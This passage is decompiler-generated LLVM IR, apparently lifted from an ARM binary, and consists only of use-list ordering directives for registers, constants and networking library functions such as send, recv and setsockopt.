  uselistorder i32 %v1_11778, { 1, 0 }
  uselistorder i32 %v1_11774, { 1, 0 }
  uselistorder i32 %v1_1176c, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 %v3_11768, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_11768, { 0, 2, 1 }
  uselistorder i32 %v0_11730.pr, { 1, 0 }
  uselistorder i1 %v7_11708, { 1, 0 }
  uselistorder i1 %v2_116f4, { 1, 0, 2 }
  uselistorder i1 %v2_116dc, { 1, 0, 2 }
  uselistorder i32 %v1_116fc, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v1_116d0, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v1_116f8, { 1, 0 }
  uselistorder i32 %v2_11700, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %v3_116bc, { 0, 2, 1, 3 }
  uselistorder i32 %v0_11684, { 4, 19, 5, 17, 6, 18, 7, 16, 8, 15, 9, 14, 10, 13, 3, 2, 11, 12, 20, 1, 0 }
  uselistorder i32 %v1_11660, { 1, 2, 3, 0 }
  uselistorder i32 %v3_1165c, { 1, 0 }
  uselistorder i32 %v5_11640, { 0, 2, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 %v2_1162c, { 1, 0, 2 }
  uselistorder i32 %v3_11628, { 1, 0, 2 }
  uselistorder i32 %v0_11fa8, { 1, 0, 2 }
  uselistorder i32 %v0_115fc, { 1, 0, 2 }
  uselistorder i1 %v7_115dc, { 1, 0 }
  uselistorder i32 %v0_11544, { 0, 3, 2, 4, 6, 5, 1 }
  uselistorder i32 %v2_11518, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_11510, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_114a4, { 2, 1, 0 }
  uselistorder i32 %v3_114a0, { 1, 0 }
  uselistorder i1 %v7_11484, { 1, 0 }
  uselistorder i32 %v3_11480, { 5, 4, 2, 1, 0, 6, 7, 3 }
  uselistorder i32 %v0_11474, { 1, 0 }
  uselistorder i32 %v1_11458, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v1_11444, { 2, 1, 0 }
  uselistorder i32 %v3_11440, { 1, 0 }
  uselistorder i32 %v0_11444, { 1, 0 }
  uselistorder i32 %v2_113dc, { 1, 0 }
  uselistorder i32 %v1_113dc, { 1, 3, 0, 2, 4 }
  uselistorder i32 %v0_113dc, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v1_113b8, { 2, 1, 0 }
  uselistorder i32 %v1_113b4, { 1, 0 }
  uselistorder i32 %v2_11384, { 1, 0 }
  uselistorder i32 %v0_11384, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v1_1137c, { 1, 0 }
  uselistorder i1 %v7_11344, { 0, 3, 1, 2 }
  uselistorder i1 %v2_11344, { 1, 2, 0 }
  uselistorder i32 %v2_1133c, { 0, 3, 4, 2, 1 }
  uselistorder i32 %v0_11334, { 1, 0 }
  uselistorder i32 %v1_11318, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v2_1130c, { 1, 0 }
  uselistorder i32 %v1_1130c, { 1, 3, 0, 2, 4 }
  uselistorder i32 %v0_1130c, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v1_112fc, { 1, 0 }
  uselistorder i32 %v3_11360, { 5, 7, 4, 8, 6, 1, 0, 10, 3, 2, 9 }
  uselistorder i32 %storemerge233, { 1, 0, 2 }
  uselistorder i32 %v3_11250, { 1, 0 }
  uselistorder i32 %v1_1123c, { 1, 0 }
  uselistorder i32 %v1_11224, { 1, 2, 0 }
  uselistorder i32 %v0_11230, { 0, 3, 2, 1 }
  uselistorder i32 %v0_111f4, { 2, 1, 0, 3, 5, 4 }
  uselistorder i32 %v2_111e8, { 2, 1, 0 }
  uselistorder i32 %v1_111c4, { 3, 1, 0, 4, 2 }
  uselistorder i1 %v2_1119c, { 1, 0 }
  uselistorder i32 %v0_11100, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_110a8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v4_10fcc, { 1, 0 }
  uselistorder i32 %v1_10fc8, { 1, 0 }
  uselistorder i32 %v4_10fa4, { 1, 0 }
  uselistorder i1 %v2_10f14, { 1, 0 }
  uselistorder i1 %v3_10ef8, { 1, 0, 2 }
  uselistorder i1 %v2_10ee4, { 1, 0 }
  uselistorder i1 %v2_10ec0, { 1, 0 }
  uselistorder i32 %v1_10e70, { 14, 13, 12, 11, 15, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10e5c, { 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 20, 21, 22, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 6, 7, 8, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_10e58, { 4, 5, 6, 7, 0, 8, 1, 2, 3, 9 }
  uselistorder i32 %v4_10e48, { 1, 0 }
  uselistorder i32 %v0_10e38, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10e14, { 1, 0 }
  uselistorder i32 %v2_115b4, { 0, 2, 3, 4, 1 }
  uselistorder i32* %v2_115a8, { 0, 3, 7, 4, 2, 5, 6, 8, 1 }
  uselistorder i32 %v2_115a0, { 0, 3, 7, 4, 2, 5, 6, 8, 1 }
  uselistorder i32 %v2_11dcc, { 1, 0 }
  uselistorder i32 %v2_11370, { 0, 4, 1, 5, 2, 7, 3, 6 }
  uselistorder i32 %v2_10e00, { 1, 2, 4, 5, 0, 3, 8, 7, 6, 9 }
  uselistorder i32 %v2_10dfc, { 3, 2, 0, 5, 4, 1, 6 }
  uselistorder i32 %v4_10bc0, { 1, 0 }
  uselistorder i32 %v4_10b60, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_10b58, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10b00, { 3, 2, 0, 1 }
  uselistorder i1 %v7_10aa0, { 1, 0 }
  uselistorder i32 %v3_10a98, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v0_10a80, { 0, 2, 1 }
  uselistorder i32 %v0_10a68, { 2, 1, 0 }
  uselistorder i32 %v0_10a44, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %storemerge241, { 1, 0 }
  uselistorder i32 %v0_109d8, { 1, 2, 3, 0, 4 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 11, 14, 12, 13 }
  uselistorder i32* %stack_var_-92, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-64, { 1, 0, 2 }
  uselistorder i32* %stack_var_-56, { 1, 5, 6, 7, 4, 8, 3, 2, 9, 0, 10, 11 }
  uselistorder i8* %stack_var_-52, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32* %stack_var_-38, { 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 3, 1, 2, 0, 4, 5 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 10, 7, 8, 9, 11 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 62, 11, 12, 57, 63, 43, 64, 65, 134, 13, 14, 15, 35, 44, 45, 46, 47, 0, 1, 2, 3, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 37, 38, 39, 40, 58, 59, 60, 41, 42, 48, 49, 50, 51, 52, 53, 54, 55, 56, 66, 67, 68, 69, 70, 71, 61, 72, 73, 75, 74, 76, 77, 78, 79, 81, 83, 82, 80, 84, 85, 86, 87, 93, 88, 89, 90, 91, 94, 137, 138, 95, 135, 136, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 133, 113, 114, 115, 116, 117, 118, 120, 119, 122, 121, 92, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 139, 140 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 16, 45, 51, 37, 14, 15, 17, 18, 19, 33, 38, 39, 40, 41, 0, 1, 2, 46, 20, 21, 23, 22, 24, 26, 25, 27, 29, 28, 30, 31, 32, 34, 36, 35, 47, 49, 48, 42, 43, 44, 52, 53, 54, 55, 56, 57, 58, 50, 59, 60, 61, 62, 63, 65, 67, 66, 145, 64, 68, 69, 70, 71, 75, 72, 73, 74, 76, 79, 78, 80, 77, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 99, 100, 97, 98, 101, 102, 103, 104, 105, 106, 107, 109, 108, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 146, 147 }
  uselistorder i32* %r1.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 47, 11, 12, 13, 14, 40, 48, 36, 37, 15, 16, 17, 32, 33, 38, 39, 1, 2, 3, 41, 113, 114, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 34, 35, 42, 43, 0, 49, 50, 51, 52, 44, 45, 46, 53, 54, 55, 57, 58, 56, 59, 60, 62, 61, 120, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 115, 116, 117, 118, 119 }
  uselistorder i32* %r0.global-to-local, { 11, 13, 12, 14, 15, 16, 18, 17, 19, 20, 21, 133, 132, 22, 23, 25, 24, 26, 28, 27, 29, 31, 30, 113, 114, 115, 117, 116, 32, 135, 134, 104, 107, 106, 137, 139, 140, 136, 141, 138, 34, 33, 35, 37, 36, 38, 40, 39, 41, 92, 91, 94, 93, 95, 96, 109, 108, 110, 2, 1, 3, 5, 4, 7, 6, 8, 9, 10, 119, 118, 43, 44, 46, 45, 47, 42, 48, 49, 50, 51, 53, 52, 55, 54, 57, 56, 58, 59, 60, 61, 63, 62, 65, 64, 67, 66, 68, 69, 70, 71, 73, 72, 75, 74, 77, 76, 78, 79, 80, 82, 81, 83, 85, 84, 87, 86, 88, 89, 90, 98, 97, 105, 99, 100, 101, 121, 120, 123, 122, 102, 103, 112, 111, 144, 142, 125, 124, 126, 128, 127, 129, 130, 131, 152, 143, 145, 146, 147, 149, 148, 150, 157, 151, 153, 156, 154, 155, 159, 160, 158, 163, 161, 162, 165, 164, 166, 168, 167, 216, 169, 170, 171, 0, 172, 173, 175, 174, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 211, 210, 213, 212, 214, 215, 219, 217, 218, 220, 221, 222, 223 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 16, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 18 }
  uselistorder i32* %ip.global-to-local, { 2, 23, 3, 16, 0, 1, 21, 4, 5, 7, 6, 9, 8, 10, 11, 12, 13, 14, 20, 15, 22, 17, 18, 19, 24, 25, 26, 27, 28, 29, 30, 31, 34, 32, 33, 35, 48, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 49, 50, 51 }
  uselistorder i1* %cpsr_z.global-to-local, { 9, 10, 111, 201, 200, 93, 94, 99, 101, 102, 103, 104, 105, 11, 191, 13, 14, 15, 55, 56, 57, 74, 75, 76, 77, 78, 0, 1, 6, 7, 2, 3, 4, 5, 8, 95, 16, 17, 18, 19, 20, 25, 26, 21, 22, 23, 24, 27, 28, 29, 34, 35, 30, 31, 32, 33, 36, 37, 38, 43, 44, 39, 40, 41, 42, 45, 46, 47, 52, 53, 48, 49, 50, 51, 54, 58, 59, 63, 64, 60, 61, 62, 65, 97, 66, 71, 72, 67, 68, 69, 70, 73, 96, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 192, 106, 107, 108, 109, 110, 193, 98, 12, 100, 112, 114, 113, 115, 116, 118, 120, 119, 194, 117, 121, 122, 123, 124, 125, 126, 131, 127, 128, 129, 130, 197, 198, 195, 196, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 150, 149, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 190, 167, 168, 169, 170, 171, 189, 172, 173, 174, 188, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 199, 202 }
  uselistorder i1* %cpsr_c.global-to-local, { 9, 10, 11, 108, 197, 196, 90, 91, 96, 98, 99, 100, 101, 102, 12, 186, 13, 14, 15, 16, 55, 56, 57, 74, 75, 76, 77, 0, 1, 6, 7, 2, 3, 4, 5, 8, 92, 17, 18, 19, 20, 25, 26, 21, 22, 23, 24, 27, 28, 29, 34, 35, 30, 31, 32, 33, 36, 37, 38, 43, 44, 39, 40, 41, 42, 45, 46, 47, 52, 53, 48, 49, 50, 51, 54, 58, 59, 63, 64, 60, 61, 62, 65, 94, 66, 71, 72, 67, 68, 69, 70, 73, 93, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 188, 103, 104, 105, 106, 107, 189, 95, 187, 97, 109, 111, 110, 112, 114, 116, 115, 190, 113, 117, 118, 119, 120, 121, 126, 122, 123, 124, 125, 193, 194, 191, 127, 192, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 185, 158, 159, 160, 161, 162, 184, 163, 164, 165, 183, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 195, 198 }
  uselistorder i32 104, { 0, 3, 1, 4, 2, 5 }
  uselistorder %sockaddr** @global_var_1c224.158, { 1, 2, 0 }
  uselistorder i32 ptrtoint (%sockaddr** @global_var_1c224.158 to i32), { 1, 0 }
  uselistorder i8 31, { 7, 1, 2, 0, 3, 4, 8, 5, 6, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i8 30, { 6, 0, 1, 2, 3, 7, 4, 5, 8 }
  uselistorder i32* (i32*, i32*, i32)* @memcpy, { 0, 2, 1, 3 }
  uselistorder i32* (i32*, i32*, i32)* @memmove, { 4, 0, 1, 2, 3, 6, 5, 7 }
  uselistorder i32* bitcast ([3 x i8]* @global_var_13688.86 to i32*), { 4, 2, 3, 1, 0, 6, 5 }
  uselistorder [3 x i8]* @global_var_13688.86, { 1, 0 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_13688.86 to i32), { 16, 17, 18, 19, 20, 21, 22, 12, 23, 3, 24, 15, 25, 13, 26, 14, 27, 0, 28, 1, 29, 2, 30, 4, 31, 5, 32, 6, 33, 7, 34, 8, 35, 9, 36, 10, 37, 11, 38 }
  uselistorder i8 58, { 6, 4, 5, 3, 2, 1, 0, 7, 8 }
  uselistorder i8 57, { 6, 4, 5, 3, 2, 1, 0, 7, 8 }
  uselistorder i8 62, { 6, 4, 5, 3, 2, 1, 0 }
  uselistorder i8 61, { 6, 4, 5, 3, 2, 1, 0, 7, 8 }
  uselistorder i8 37, { 5, 3, 4, 2, 1, 0 }
  uselistorder i8 34, { 6, 4, 5, 3, 2, 1, 0, 7, 8, 9, 10 }
  uselistorder i8 36, { 11, 12, 7, 8, 9, 10, 5, 6, 3, 4, 2, 0, 1 }
  uselistorder i8 35, { 12, 13, 8, 9, 10, 11, 6, 7, 4, 5, 2, 3, 0, 1 }
  uselistorder i32 (i32, i32*, i32, i32)* @send, { 25, 24, 23, 22, 21, 15, 2, 29, 27, 26, 1, 3, 4, 0, 5, 6, 14, 12, 13, 28, 18, 16, 17, 8, 7, 11, 10, 20, 19, 9, 30 }
  uselistorder i32 251, { 3, 4, 5, 0, 1, 2 }
  uselistorder i8 -3, { 1, 2, 3, 0 }
  uselistorder i8 -4, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i32 (i32, i32*, i32, i32)* @recv, { 0, 4, 5, 8, 9, 7, 6, 1, 3, 2, 10 }
  uselistorder i32 (i32)* @function_121c8, { 31, 23, 22, 30, 24, 32, 29, 28, 27, 26, 25, 21, 20, 5, 19, 18, 17, 33, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 0, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @function_12df8, { 21, 24, 22, 23, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 0, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32*)* @function_1219c, { 1, 2, 8, 0, 3, 4, 5, 6, 7, 9, 10, 31, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 55, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54 }
  uselistorder i32 (i32)* @function_12280, { 41, 40, 34, 42, 39, 38, 37, 36, 35, 33, 32, 16, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 0, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i8* bitcast (i8** @global_var_1c214.214 to i8*), { 4, 0, 3, 2, 1 }
  uselistorder i8* @global_var_1c215.215, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32*, i32*)* @getsockopt, { 0, 2, 1, 3 }
  uselistorder i32 (i32, %_TYPEDEF_fd_set*, %_TYPEDEF_fd_set*, %_TYPEDEF_fd_set*, %timeval*)* @select, { 0, 2, 1, 3 }
  uselistorder %_TYPEDEF_fd_set* null, { 1, 2, 0 }
  uselistorder i32 284, { 3, 4, 5, 6, 0, 1, 2, 7 }
  uselistorder i32* @r7, { 25, 26, 6, 7, 8, 14, 15, 16, 2, 5, 23, 9, 10, 11, 12, 13, 17, 18, 19, 20, 21, 22, 24, 1, 27, 153, 154, 155, 156, 28, 0, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 4, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 149, 145, 146, 147, 148, 150, 151, 152, 157, 158, 159, 160, 165, 161, 162, 163, 164, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 3, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211 }
  uselistorder i32 1536, { 1, 0 }
  uselistorder i32* @sp, { 4, 0, 5, 1, 6, 2, 7, 3 }
  uselistorder i32 1664, { 2, 0, 1 }
  uselistorder void (i32)* @exit, { 5, 4, 3, 0, 2, 1, 6 }
  uselistorder i32 ()* @function_10744, { 3, 2, 1, 0 }
  uselistorder i32 254, { 8, 9, 10, 0, 1, 2, 3, 11, 4, 12, 5, 13, 6, 14, 7, 15 }
  uselistorder i8 2, { 0, 3, 2, 1 }
  uselistorder i32 39, { 5, 0, 1, 6, 2, 7, 3, 8, 4 }
  uselistorder i32 38, { 3, 0, 4, 1, 5, 2, 6, 7, 8, 9, 10 }
  uselistorder i32 (i32, i32*, i32, i32, %sockaddr*, i32*)* @recvfrom, { 1, 0, 2 }
  uselistorder i32 (i32, i32*, i32, i32, %sockaddr*, i32)* @sendto, { 7, 6, 0, 4, 1, 2, 8, 3, 5, 9 }
  uselistorder i32 16384, { 32, 51, 33, 52, 34, 53, 35, 54, 36, 55, 37, 56, 13, 57, 12, 68, 0, 49, 1, 50, 2, 58, 3, 59, 4, 60, 5, 61, 6, 62, 7, 63, 8, 64, 9, 65, 30, 66, 31, 67, 28, 70, 29, 71, 26, 27, 69, 38, 72, 10, 73, 11, 74, 40, 75, 15, 76, 41, 77, 42, 78, 43, 79, 14, 80, 39, 81, 16, 82, 17, 83, 18, 84, 44, 45, 19, 85, 20, 86, 22, 87, 21, 88, 23, 89, 24, 90, 47, 91, 48, 92, 25, 93, 46, 94 }
  uselistorder i32 (i32, i32, i32, i32)* @function_f1e4, { 8, 7, 6, 0, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @function_f188, { 10, 9, 8, 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i8* @global_var_1c1f8.305, { 2, 1, 0 }
  uselistorder i32 16711680, { 1, 0 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32 214, { 1, 0 }
  uselistorder i32 33, { 0, 6, 1, 7, 2, 8, 3, 9, 10, 4, 5, 11 }
  uselistorder i32 54, { 3, 0, 4, 1, 5, 2, 6 }
  uselistorder i32 27, { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 20, { 14, 15, 0, 16, 1, 17, 13, 18, 19, 20, 23, 21, 2, 22, 24, 25, 26, 27, 29, 30, 28, 3, 31, 32, 33, 34, 35, 36, 39, 40, 37, 4, 38, 41, 42, 43, 44, 45, 46, 49, 50, 47, 5, 48, 51, 52, 53, 54, 57, 58, 55, 6, 56, 59, 60, 61, 62, 63, 64, 67, 65, 12, 66, 68, 69, 70, 73, 8, 71, 7, 72, 74, 75, 78, 10, 76, 9, 77, 79, 80, 81, 82, 83, 84, 11, 85 }
  uselistorder i32 22, { 1, 0 }
  uselistorder i32 223, { 3, 0, 1, 2 }
  uselistorder i32 62, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 31, { 12, 18, 13, 19, 14, 20, 15, 11, 21, 16, 3, 0, 4, 17, 5, 6, 1, 7, 8, 2, 9, 10 }
  uselistorder i32 30, { 1, 5, 2, 6, 3, 7, 0, 8, 4, 9 }
  uselistorder i32 56, { 2, 3, 0, 1 }
  uselistorder i32 127, { 5, 0, 6, 3, 7, 1, 8, 2, 9, 4, 10 }
  uselistorder i32 126, { 11, 5, 0, 6, 1, 7, 2, 8, 3, 9, 4, 10 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_1372c.273 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_136e4.257 to i32), { 0, 20, 1, 21, 2, 22, 3, 23, 4, 24, 5, 25, 6, 26, 7, 27, 8, 28, 9, 29, 10, 30, 11, 31, 12, 32, 13, 33, 14, 34, 15, 35, 16, 36, 17, 37, 18, 38, 19, 39 }
  uselistorder i32 ptrtoint (i32* @global_var_136b0.251 to i32), { 0, 6, 1, 7, 2, 8, 3, 9, 4, 10, 5, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_137dc.249 to i32), { 0, 2, 1, 3 }
  uselistorder i32 13, { 5, 6, 7, 8, 4, 9, 0, 10, 11, 12, 13, 14, 1, 15, 16, 17, 18, 19, 20, 21, 2, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 3, 34, 35 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_137d0.247 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @function_10818, { 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_137b8.241 to i32), { 0, 9, 1, 10, 2, 11, 3, 4, 5, 12, 6, 13, 7, 14, 8, 15 }
  uselistorder i8* @global_var_1c209.237, { 1, 0 }
  uselistorder i32* @r6, { 9, 10, 22, 23, 11, 12, 20, 13, 14, 15, 16, 17, 18, 19, 24, 25, 21, 26, 27, 28, 29, 30, 31, 32, 33, 171, 172, 173, 174, 0, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 1, 59, 60, 61, 2, 62, 63, 66, 64, 65, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 86, 81, 82, 83, 84, 85, 87, 88, 89, 90, 91, 92, 98, 93, 94, 95, 96, 97, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 121, 117, 118, 119, 120, 122, 123, 124, 125, 126, 127, 128, 129, 134, 130, 131, 132, 133, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 3, 151, 152, 153, 154, 155, 156, 157, 158, 159, 167, 160, 161, 162, 163, 164, 165, 166, 168, 169, 170, 175, 176, 177, 178, 186, 179, 180, 181, 182, 183, 184, 185, 187, 188, 189, 190, 194, 191, 192, 193, 195, 196, 8, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 4, 211, 212, 213, 214, 215, 216, 218, 5, 217, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 6, 7, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264 }
  uselistorder i32 80, { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_1c1fc.228 to i32), { 3, 2, 4, 5, 0, 6, 1, 7, 8 }
  uselistorder i8 64, { 5, 0, 1, 6, 2, 3, 4 }
  uselistorder i8* @global_var_1c208.229, { 1, 0 }
  uselistorder i32 40, { 1, 6, 7, 8, 2, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 3, 19, 4, 20, 5, 21 }
  uselistorder i32 ptrtoint (i32* @global_var_1c1e8.224 to i32), { 0, 2, 1, 4, 5, 3, 6, 7, 8, 9 }
  uselistorder i32 1024, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 1023, { 4, 0, 1, 2, 5, 3, 6 }
  uselistorder i32 65280, { 27, 1, 14, 0, 2, 3, 28, 4, 5, 29, 21, 22, 30, 6, 31, 15, 16, 32, 7, 33, 34, 8, 17, 9, 35, 23, 18, 36, 37, 38, 39, 10, 24, 25, 26, 40, 11, 41, 42, 19, 43, 44, 12, 45, 46, 20, 47, 48, 13, 49 }
  uselistorder i32 ()* @function_105b0, { 66, 65, 64, 63, 62, 61, 2, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 7, 6, 5, 4, 3, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32*, i32)* @setsockopt, { 10, 9, 8, 6, 5, 7, 1, 0, 3, 2, 4, 11 }
  uselistorder i32 2048, { 3, 0, 1, 4, 2, 5, 6, 7 }
  uselistorder i32 (i32, i32, ...)* @fcntl, { 2, 1, 0, 3, 7, 6, 5, 4, 9, 8, 11, 10, 12 }
  uselistorder i32* @global_var_1c238.222, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* @global_var_1c234.220, { 1, 2, 3, 4, 0 }
  uselistorder i32* (i32, i32)* @calloc, { 24, 21, 0, 1, 3, 2, 22, 5, 4, 8, 7, 6, 11, 10, 30, 29, 9, 16, 15, 34, 33, 23, 17, 26, 25, 19, 18, 28, 27, 32, 31, 14, 13, 12, 20, 35 }
  uselistorder i32 288, { 1, 2, 5, 6, 0, 7, 3, 4, 8 }
  uselistorder i32* @global_var_1c218.208, { 2, 0, 3, 4, 1, 5, 6 }
  uselistorder i32 (i32*)* @time, { 20, 27, 26, 21, 19, 18, 17, 16, 15, 14, 7, 6, 5, 2, 1, 0, 13, 12, 11, 10, 9, 8, 24, 23, 22, 25, 3, 4, 28 }
  uselistorder i32* @global_var_1c21c.135, { 3, 4, 0, 1, 2, 5, 6, 13, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 ()* @function_12fec, { 1, 0, 2 }
  uselistorder i32* @global_var_1c23c.206, { 0, 2, 1 }
